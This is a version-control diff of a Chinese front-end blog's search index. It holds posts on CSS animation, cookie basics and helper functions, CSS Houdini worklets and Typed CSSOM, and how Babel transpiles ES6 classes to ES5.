-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div style=<span class="string">"width: 200px;"</span> id=<span class="string">"div1"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;div style=<span class="string">"width: 300px;"</span> id=<span class="string">"div2"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=<span class="string">"div3"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;div style=<span class="string">"margin-left: calc(5em + 50%);"</span> id=<span class="string">"div4"</span>&gt;&lt;/div&gt;</span><br><span class="line"><span class="keyword">var</span> w1 = $(<span class="string">'#div1'</span>).styleMap.get(<span class="string">'width'</span>);</span><br><span class="line"><span class="keyword">var</span> w2 = $(<span class="string">'#div2'</span>).styleMap.get(<span class="string">'width'</span>);</span><br><span class="line">$(<span class="string">'#div3'</span>).styleMap.set(<span class="string">'background-size'</span>,</span><br><span class="line">  [<span class="keyword">new</span> SimpleLength(<span class="number">200</span>, <span class="string">'px'</span>), w1.add(w2)])</span><br><span class="line">$(<span class="string">'#div4'</span>)).styleMap.get(<span class="string">'margin-left'</span>)</span><br><span class="line">  <span class="comment">// =&gt; &#123;em: 5, percent: 50&#125;</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>参考文章<br><a href="https://zhuanlan.zhihu.com/p/20939640" target="_blank" rel="noopener">Houdini：CSS 领域最令人振奋的革新
-</a><br><a href="https://developers.google.com/web/updates/2016/05/houdini" target="_blank" rel="noopener">Houdini: Demystifying CSS</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>css 进阶</category>
-      </categories>
-      <tags>
-        <tag>浏览器</tag>
-        <tag>css</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>css 动画和硬件加速</title>
     <url>/2018/11/19/css-animation-and-gpu-accelerated/</url>
     <content><![CDATA[<h2 id="什么是动画"><a href="#什么是动画" class="headerlink" title="什么是动画"></a>什么是动画</h2><p>浏览器的动画原理和翻页动画类似，通过不断更新绘制 DOM 和 CSS 形成的动画，绘制的速度够快，人眼就察觉不出每一帧的间隔，视觉上就是连续的动画。大部分浏览器的刷新频率为 60Hz ，也就是一秒 60 帧。setInterval 或 setTimeout 做的动画根据人为定义的时间间隔绘制，如果间隔定义小于浏览器显示频率（16.7ms）假设为10ms，就会导致第三帧丢失。</p>
@@ -448,6 +285,124 @@
       <tags>
         <tag>css</tag>
         <tag>硬件加速</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>cookie 基础概念</title>
+    <url>/2018/11/20/cookie-base-concept/</url>
+    <content><![CDATA[<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>我们常说的 cookie ，也称为 HTTP Cookie ，它其实是 HTTP 头部中的一段信息，记录客户端和服务器端的交互中的一些信息。它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。</p>
+<h3 id="Set-Cookie"><a href="#Set-Cookie" class="headerlink" title="Set-Cookie"></a>Set-Cookie</h3><p><a href="https://tools.ietf.org/html/rfc6265#section-4.1" target="_blank" rel="noopener">RFC 6265</a> 规定，服务端可以在 HTTP 响应头部设置 cookie。格式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Cookie:&lt;cookie&gt;</span><br></pre></td></tr></table></figure>
+<p>cookie 以一对键-值对开始，后面跟着若干属性-值对。属性的详细信息查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie" target="_blank" rel="noopener">MDN Set-Cookie</a>。</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>value</th>
+<th>detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Expires</td>
+<td>符合 HTTP-date 规范的时间戳</td>
+<td>若不设置，说明这是一个会话期 cookie</td>
+</tr>
+<tr>
+<td>Max-Age</td>
+<td>cookie 存活的时间，单位是秒。</td>
+<td>优先级比 Expires 高</td>
+</tr>
+<tr>
+<td>Domain</td>
+<td>cookie 可以送达的主机名</td>
+<td>假如没有指定，那么默认值为当前文档访问地址中的主机部分（但是不包含子域名）</td>
+</tr>
+<tr>
+<td>Path</td>
+<td>指定一个 URL 路径，这个路径必须出现在要请求的资源的路径中才可以发送 Cookie 首部</td>
+<td>字符  %x2F (“/“) 可以解释为文件目录分隔符，此目录的下级目录也满足匹配的条件（例如，如果 path=/docs，那么 “/docs”, “/docs/Web/“ 或者 “/docs/Web/HTTP” 都满足匹配的条件）。如果没有设置这个值，用户代理会默认使用 HTTP 请求 URI 的 path</td>
+</tr>
+<tr>
+<td>Secure</td>
+<td>只有在浏览器认为当前通道是“安全”的，才会把带有 Secure 选项的 cookie 发送到服务端</td>
+<td>浏览器认为的安全，通常是在 HTTPS 下</td>
+</tr>
+<tr>
+<td>HttpOnly</td>
+<td>设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由  Document.cookie 属性、XMLHttpRequest 和  Request APIs 进行访问，以防范跨站脚本攻击（XSS）</td>
+</tr>
+</tbody>
+</table>
+<p>一个 Set-Cookie 首部字段，只能设置一个 cookie，如果要设置多个 cookie ，直接用多个 Set-Cookie 字段。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Cookie:&lt;cookie1&gt;</span><br><span class="line">Set-Cookie:&lt;cookie2&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="cookie的读写"><a href="#cookie的读写" class="headerlink" title="cookie的读写"></a>cookie的读写</h3><p>原生 node 的 res.setHeader 和 res.writeHead ，如果直接对 Set-Cookie 赋值，会出现覆盖的情况。其实也好理解，对对象的某个属性重复写入值，只有最后一个会保留。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">res.setHeader(<span class="string">"Set-Cookie"</span>, <span class="string">"yang=ozz; Max-Age=500"</span>);</span><br></pre></td></tr></table></figure>
+<p>要在 HTTP 头部加入多个 Set-Cookie 字段，需要对响应流拼接多个 Set-Cookie 选项。为了节省时间，这里用 express 。</p>
+<p>设置以下 cookie</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Cookie: yan=eee; Max-Age=600; Path=/; Expires=Invalid Date</span><br><span class="line">Set-Cookie: agg=sss; Max-Age=600; Path=/; Expires=Invalid Date</span><br></pre></td></tr></table></figure>
+<p>通过 document.cookie 或直接在浏览器 Application 面板中，可以直接访问，修改 cookie 。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie // &quot;yan=eee; agg=sss&quot;</span><br><span class="line">document.cookie = &quot;yan=www&quot;;</span><br><span class="line">document.cookie // &quot;agg=sss; yan=www&quot;</span><br></pre></td></tr></table></figure>
+<p>document.cookie 修改 cookie 只能一个个修改，格式和 Set-Cookie 一样。没有指定修改的属性保持不变，修改的值便覆盖原来的值。</p>
+<h4 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h4><p>HttpOnly 只能由服务端设置，本地的设置不会生效。而且设置了 HTTPOnly 的 cookie 无法通过 document.cookie 访问。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Cookie: yan=eee; Max-Age=600; Path=/; Expires=Invalid Date; HttpOnly</span><br><span class="line">Set-Cookie: agg=sss; Max-Age=600; Path=/; Expires=Invalid Date</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie // &quot;agg=sss&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="cookie-删改"><a href="#cookie-删改" class="headerlink" title="cookie 删改"></a>cookie 删改</h3><p>修改 cookie</p>
+<p>要想修改一个cookie，只需要重新赋值就行，旧的值会被新的值覆盖。但要注意一点，在设置新cookie时，path/domain这几个选项一定要旧cookie 保持一样。否则不会修改旧值，而是添加了一个新的 cookie。</p>
+<p>删除 cookie</p>
+<p>删除一个cookie 也挺简单，也是重新赋值，只要将这个新cookie的expires 选项设置为一个过去的时间点就行了。但同样要注意，path/domain/这几个选项一定要旧cookie 保持一样。</p>
+<p>原生的 cookie 的读写接口都不太友好，一般需要封装方法。</p>
+<ul>
+<li>读取 cookie</li>
+</ul>
+<p>document.cookie 的结果是一串字符串，是以“; ”分隔开的 cookie 键值对。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ary = <span class="built_in">document</span>.cookie.match(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(^| )"</span> + name + <span class="string">"=([^;]*)(;|$)"</span>));</span><br><span class="line">    <span class="comment">// 第二个捕获组就是 key=value; 的 value</span></span><br><span class="line">    <span class="keyword">return</span> ary[<span class="number">2</span>] ? ary[<span class="number">2</span>] : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getCookie(<span class="string">'agg'</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// options</span></span><br><span class="line"><span class="comment">// |-- expires  自设置起过期秒数</span></span><br><span class="line"><span class="comment">// |-- callback 设置成功后回调</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">name, value, options</span>) </span>&#123;</span><br><span class="line">    options = options ? options : &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> exp = <span class="keyword">new</span> Data();</span><br><span class="line">    <span class="keyword">var</span> expire = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (options.expires) &#123;</span><br><span class="line">        exp.setTime(exp.getTime + expires * <span class="number">1000</span>);</span><br><span class="line">        expire = exp.toGMTString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.cookie = name + <span class="string">"="</span> + <span class="built_in">escape</span>(value) + <span class="string">";path=/;expires="</span> + expire;</span><br><span class="line">    options.callback &amp;&amp; options.callback();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>网络</category>
+      </categories>
+      <tags>
+        <tag>网络</tag>
+        <tag>客户端储存</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CSS Houdini</title>
+    <url>/2018/11/21/css-Houdini/</url>
+    <content><![CDATA[<p>借用<a href="https://developers.google.com/web/updates/2016/05/houdini" target="_blank" rel="noopener">谷歌开发者文档</a>的比喻，CSS Houdini 允许你自己当一名魔术师——传统流程中，你改变了 css 的一个样式，可能整个页面的样式都大变样，但是你只能看着浏览器呈现这场魔法盛宴，自己无法参与。CSS Houdini 赋予了你魔术师的本领，你也可以参与浏览器处理样式和布局的流程。</p>
+<p>Houdini 是 W3C 新成立的一个任务小组，它的终极目标是实现 css 属性的完全兼容。Houdini 提出了一个前无古人的的设想：开放 CSS 的 API 给开发者，开发者可以通过这套接口自行扩展 CSS，并提供相应的工具允许开发者介入浏览器渲染引擎的样式和布局流程中。</p>
+<h3 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h3><h4 id="Worklets"><a href="#Worklets" class="headerlink" title="Worklets"></a>Worklets</h4><p>此规范定义了一个 API ，规范了渲染流程中的各个阶段运行的独立于主 javascript 执行环境的脚本。Worklets 的概念和 Web Worker 相似，它们允许你引入脚本文件并执行特定的 JS 代码。Worklets 和 Web Worker 有很多概念上的重叠，那么搞出一个 Worklets 是否多此一举？</p>
+<p>Worklets ，后缀 <code>-let</code> 已经表面了它的特性“小”。存在这种可能：脚本中某些代码片段，在每一帧都要跑一次。Web Worker 其实比较笨重，并不鼓励大量使用。举个例子，为一张四百万像素的图片的每一个像素启用一个 Web Worker 将是不妥当的。</p>
+<p>Worklets 定义了一个方法集合，这些方法的特性由 Worklets 的类型预定义了，开发者所能执行的操作类型被限定，这样就保证了性能。</p>
+<h4 id="CSS-Paint-API"><a href="#CSS-Paint-API" class="headerlink" title="CSS Paint API"></a>CSS Paint API</h4><p>Paint API 在 Chrome 65 默认开启支持，它也被称为 “Houdini’s paint worklet”，它允许 Web 开发人员使用 JavaScript 自定义 CSS <code>image</code>（背景，边框，内容），自定义的 <code>image</code> 会响应样式和尺寸的变化。 </p>
+<p>下面是<a href="https://developers.google.com/web/updates/2018/01/paintapi" target="_blank" rel="noopener">谷歌开发者文档</a>给的一个例子。</p>
+<p>在 Worklets 脚本文件中，先定义一个 CheckerboardPainter 的类，里面规定了画棋盘的方法。然后用 <code>registerPaint</code> 方法注册一个 paint worklet 类。这个 paint worklet 名为 checkerboard 。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// checkerboard.js</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CheckerboardPainter</span> </span>&#123;</span><br><span class="line">  paint(ctx, geom, properties) &#123;</span><br><span class="line">    <span class="comment">// Use `ctx` as if it was a normal canvas</span></span><br><span class="line">    <span class="keyword">const</span> colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>];</span><br><span class="line">    <span class="keyword">const</span> size = <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> y = <span class="number">0</span>; y &lt; geom.height/size; y++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; geom.width/size; x++) &#123;</span><br><span class="line">        <span class="keyword">const</span> color = colors[(x + y) % colors.length];</span><br><span class="line">        ctx.beginPath();</span><br><span class="line">        ctx.fillStyle = color;</span><br><span class="line">        ctx.rect(x * size, y * size, size, size);</span><br><span class="line">        ctx.fill();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Register our class under a specific name</span></span><br><span class="line">registerPaint(<span class="string">'checkerboard'</span>, CheckerboardPainter);</span><br></pre></td></tr></table></figure>
+<p>在主 javaScript 环境中，用 <code>CSS.paintWorklet.addModule(&#39;checkerboard.js&#39;)</code> 加载这个 paint worklet ，然后在 css 属性值里面，可以调用 <code>paint(checkerboard)</code> ，就可以定义自己要的 css 背景/边框/内容 效果。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- index.html --&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  textarea &#123;</span><br><span class="line">    background-image: paint(checkerboard);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/style&gt;</span></span><br><span class="line"><span class="regexp">&lt;textarea&gt;&lt;/</span>textarea&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  CSS.paintWorklet.addModule(<span class="string">'checkerboard.js'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a href="https://googlechromelabs.github.io/houdini-samples/paint-worklet/checkerboard/" target="_blank" rel="noopener">在线 demo</a></p>
+<h4 id="Animation-Worklet"><a href="#Animation-Worklet" class="headerlink" title="Animation Worklet"></a>Animation Worklet</h4><p>Animation Worklet 是 Compositor Worklet 演化而来的。详细的资料看<a href="https://dassur.ma/things/animworklet/" target="_blank" rel="noopener">这里</a>。</p>
+<p>Compositor Worklet 允许开发者书写在合成器线程（compositor thread）。这将保证代码在每一帧运行，并且开启了一些新的可能性，例如强制实现一些和不是绑定在时间上的动画，比如输入或滚动位置。</p>
+<p>如果合成器线程阻塞了——因为代码计算量太大或者低效——那么整个页面将无法响应，动画也会卡住。</p>
+<p>Animation Worklet 不运行在合成器线程“上”，而是在“尽力而为”的基础上与它同步运行。这意味着，如果你在你的 worklet 中堵塞了，动画允许“溜走”。</p>
+<p>预计 Chrome 71 首次尝试支持 Animation Worklet，我写这篇文的时候，Chrome 71还未发布。Animation Worklet 的例子可以看<a href="https://developers.google.com/web/updates/2018/10/animation-worklet" target="_blank" rel="noopener"><br>Houdini’s Animation Worklet</a>。有 <a href="https://github.com/web-animations/web-animations-js" target="_blank" rel="noopener">polyfill</a> 提供一样的 API，但不提供一样的性能。</p>
+<h4 id="Layout-Worklet"><a href="#Layout-Worklet" class="headerlink" title="Layout Worklet"></a>Layout Worklet</h4><p>开发者可以自己定义一个布局，自定义盒子内元素的布局，然后用类似 <code>display: layout(myLayout)</code> 这样的规则应用自己的布局。这样的好处是：一方面当有新的布局出现的时候可以借助这个 API 进行 polyfill 就不用担心没有实现的浏览器不兼容，另一方面可以发挥想象力实现自己想要的布局，这样在布局上可能会百花齐放了，而不仅仅使用W3C给的那几种布局。</p>
+<h4 id="Typed-CSSOM"><a href="#Typed-CSSOM" class="headerlink" title="Typed CSSOM"></a>Typed CSSOM</h4><p>在 js 中修改一个 css 属性，可谓要翻山越岭：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#someDiv'</span>).style.height = getRandomInt() + <span class="string">'px'</span>;</span><br></pre></td></tr></table></figure>
+<p>我们做了数学计算，把一个数字转成字符串并附加一个单位，浏览器再解析这个字符串，得到一个数字，再把这个数字交回给 CSS 引擎。</p>
+<p>有了类型化 CSS 对象模型，我们可以基于 StylePropertyMap 操作元素。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div style=<span class="string">"width: 200px;"</span> id=<span class="string">"div1"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;div style=<span class="string">"width: 300px;"</span> id=<span class="string">"div2"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=<span class="string">"div3"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;div style=<span class="string">"margin-left: calc(5em + 50%);"</span> id=<span class="string">"div4"</span>&gt;&lt;/div&gt;</span><br><span class="line"><span class="keyword">var</span> w1 = $(<span class="string">'#div1'</span>).styleMap.get(<span class="string">'width'</span>);</span><br><span class="line"><span class="keyword">var</span> w2 = $(<span class="string">'#div2'</span>).styleMap.get(<span class="string">'width'</span>);</span><br><span class="line">$(<span class="string">'#div3'</span>).styleMap.set(<span class="string">'background-size'</span>,</span><br><span class="line">  [<span class="keyword">new</span> SimpleLength(<span class="number">200</span>, <span class="string">'px'</span>), w1.add(w2)])</span><br><span class="line">$(<span class="string">'#div4'</span>)).styleMap.get(<span class="string">'margin-left'</span>)</span><br><span class="line">  <span class="comment">// =&gt; &#123;em: 5, percent: 50&#125;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>参考文章<br><a href="https://zhuanlan.zhihu.com/p/20939640" target="_blank" rel="noopener">Houdini：CSS 领域最令人振奋的革新
+</a><br><a href="https://developers.google.com/web/updates/2016/05/houdini" target="_blank" rel="noopener">Houdini: Demystifying CSS</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>css 进阶</category>
+      </categories>
+      <tags>
+        <tag>浏览器</tag>
+        <tag>css</tag>
       </tags>
   </entry>
   <entry>
@@ -626,16 +581,16 @@
     <url>/2018/11/20/es6-syntax-sugar/</url>
     <content><![CDATA[<h2 id="ES6-gt-ES5"><a href="#ES6-gt-ES5" class="headerlink" title="ES6 =&gt; ES5"></a>ES6 =&gt; ES5</h2><p>转义结果来自babel</p>
 <h3 id="class"><a href="#class" class="headerlink" title="class"></a>class</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props, context)&#123;</span><br><span class="line">    <span class="keyword">this</span>.props = props;</span><br><span class="line">    <span class="keyword">this</span>.context = context;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_classCallCheck</span>(<span class="params">instance, Constructor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> Constructor)) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Cannot call a class as a function"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Component = <span class="function"><span class="keyword">function</span> <span class="title">Component</span>(<span class="params">props, context</span>) </span>&#123;</span><br><span class="line">  _classCallCheck(<span class="keyword">this</span>, Component);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.props = props;</span><br><span class="line">  <span class="keyword">this</span>.context = context;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> _classCallCheck(<span class="params">instance, Constructor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> Constructor)) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Cannot call a class as a function"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Component = <span class="function"><span class="keyword">function</span> <span class="title">Component</span>(<span class="params">props, context</span>) </span>&#123;</span><br><span class="line">  _classCallCheck(<span class="keyword">this</span>, Component);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.props = props;</span><br><span class="line">  <span class="keyword">this</span>.context = context;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 <p>通过 class 定义的“类”，不能像 <code>Component(p, c)</code> 这样创建一个对象。通过 <code>this</code> 向对象添加熟悉，和传统构造函数基本一样。</p>
 <p>如果有自定义的函数呢？</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props, context)&#123;</span><br><span class="line">    <span class="keyword">this</span>.props = props;</span><br><span class="line">  	<span class="keyword">this</span>.context = context;</span><br><span class="line">  &#125;</span><br><span class="line">  fn() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'fn'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _createClass = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">defineProperties</span>(<span class="params">target, props</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; props.length; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> descriptor = props[i];</span><br><span class="line">      descriptor.enumerable = descriptor.enumerable || <span class="literal">false</span>;</span><br><span class="line">      descriptor.configurable = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="string">"value"</span> <span class="keyword">in</span> descriptor) descriptor.writable = <span class="literal">true</span>;</span><br><span class="line">      <span class="built_in">Object</span>.defineProperty(target, descriptor.key, descriptor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">Constructor, protoProps, staticProps</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (protoProps) defineProperties(Constructor.prototype, protoProps);</span><br><span class="line">    <span class="keyword">if</span> (staticProps) defineProperties(Constructor, staticProps);</span><br><span class="line">    <span class="keyword">return</span> Constructor;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_classCallCheck</span>(<span class="params">instance, Constructor</span>) </span>&#123; <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> Constructor)) &#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Cannot call a class as a function"</span>); &#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Component = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Component</span>(<span class="params">props, context</span>) </span>&#123;</span><br><span class="line">    _classCallCheck(<span class="keyword">this</span>, Component);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.props = props;</span><br><span class="line">    <span class="keyword">this</span>.context = context;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _createClass(Component, [&#123;</span><br><span class="line">    key: <span class="string">'fn'</span>,</span><br><span class="line">    value: <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'fn'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Component;</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _createClass = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">defineProperties</span>(<span class="params">target, props</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; props.length; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> descriptor = props[i];</span><br><span class="line">      descriptor.enumerable = descriptor.enumerable || <span class="literal">false</span>;</span><br><span class="line">      descriptor.configurable = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="string">"value"</span> <span class="keyword">in</span> descriptor) descriptor.writable = <span class="literal">true</span>;</span><br><span class="line">      <span class="built_in">Object</span>.defineProperty(target, descriptor.key, descriptor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">Constructor, protoProps, staticProps</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (protoProps) defineProperties(Constructor.prototype, protoProps);</span><br><span class="line">    <span class="keyword">if</span> (staticProps) defineProperties(Constructor, staticProps);</span><br><span class="line">    <span class="keyword">return</span> Constructor;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> _classCallCheck(<span class="params">instance, Constructor</span>) </span>&#123; <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> Constructor)) &#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Cannot call a class as a function"</span>); &#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Component = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Component</span>(<span class="params">props, context</span>) </span>&#123;</span><br><span class="line">    _classCallCheck(<span class="keyword">this</span>, Component);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.props = props;</span><br><span class="line">    <span class="keyword">this</span>.context = context;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _createClass(Component, [&#123;</span><br><span class="line">    key: <span class="string">'fn'</span>,</span><br><span class="line">    value: <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'fn'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Component;</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure>
 <p>Component 变成了一个自执行匿名函数。在这个函数里面，创建一个同名的构造函数 <code>Component</code> ，最后返回它。属性的创建方法同前一个例子一样，方法则是通过 <code>_createClass</code> 方法创建。</p>
 <p>我们把 <code>Component</code> 构造函数和一个携带 <code>fn</code> 信息的对象数组传给了 <code>_createClass</code> 自执行函数（闭包），最后的结果就是通过 <code>Object.defineProperty</code> ，把函数（们）挂在了 <code>Component</code> 的原型对象（<code>Component.prototype</code>）上。class 声明的“类”中的函数，是挂在原型对象上的，由所有实例共享。</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> c1 = <span class="keyword">new</span> Component();</span><br><span class="line"><span class="keyword">var</span> c2 = <span class="keyword">new</span> Component();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(c1.fn === c2.fn); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
 <h3 id="class-extends…"><a href="#class-extends…" class="headerlink" title="class extends…"></a>class extends…</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    <span class="keyword">this</span>.props = props;</span><br><span class="line">  &#125;</span><br><span class="line">  fn() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'fn'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
